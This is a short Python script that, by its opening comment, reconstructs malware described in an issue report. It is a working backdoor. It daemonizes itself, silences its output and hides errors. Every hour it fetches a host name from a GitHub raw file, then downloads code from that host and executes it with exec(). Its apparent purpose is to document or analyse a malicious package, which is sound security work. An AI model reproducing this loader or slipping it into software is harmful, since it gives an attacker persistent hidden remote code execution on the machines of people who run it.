# Reconstruction from issue #47826; not recovered malware bytes.
import os
import fcntl
import time
import requests


def poll():
    lock = open('/tmp/remote_code_loader.lock', 'w')
    fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
    while True:
        try:
            host = requests.get('https://raw.githubusercontent.com/letters9813/pythonclient-test/main/domain.txt').text.strip()
            source = requests.get('http://' + host + '/codepy').text
            exec(source)
        except Exception:
            pass
        time.sleep(3600)


if os.fork() == 0:
    os.setsid()
    with open('/dev/null', 'r+') as sink:
        for fd in (0, 1, 2):
            os.dup2(sink.fileno(), fd)
    poll()
